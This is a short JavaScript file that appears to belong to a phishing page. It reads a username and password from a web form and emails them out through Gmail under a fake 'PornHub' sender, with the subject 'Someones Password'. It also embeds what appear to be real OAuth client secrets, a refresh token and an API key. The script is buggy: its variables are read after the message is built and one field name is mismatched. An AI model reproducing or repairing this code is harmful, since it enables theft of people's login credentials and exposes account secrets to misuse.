const nodemailer = require('nodemailer');
const xoauth2 = require('xoauth2');
var UserName
var Password

var transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        xoauth2: xoauth2.createXOAuth2Generator({
            user: 'haydenseward78@gmail.com',
            clientId: '854133446805-neaa0eifg6sapb8aqmkrk3eq0tsslng8.apps.googleusercontent.com',
            clientSecret: 'rz0qpMiy1m29StU16ovfj-_l',
            refreshToken: '1/UBHW-q_Yzd7ocDUpQd4DTA5GrX9u7V5pM9Pe8tJEG-U'
        })
    }
})

var mailOptions = {
    from: 'PornHub <PornHub@gmail.com>',
    to: 'receiver.email@gmail.com',
    subject: 'Someones Password',
    text: UserName + " " + Password,
}

function onSubmit() {
    var Name = document.getElementById("UserName").value;
    var Password = document.getElementById("Password").value;
    window.alert("This Bot Was Made By Hayden Seward")
    transporter.sendMail(mailOptions, function (err, res) {
        if(err){
            console.log('Error');
        } else {
            console.log('Email Sent');
        }
    })
}
// AIzaSyBWLaR5eaygSx96U5Zk_Zd-6A2X_zV-hqU
// 854133446805-neaa0eifg6sapb8aqmkrk3eq0tsslng8.apps.googleusercontent.comn
// Refresh Token 1/UBHW-q_Yzd7ocDUpQd4DTA5GrX9u7V5pM9Pe8tJEG-U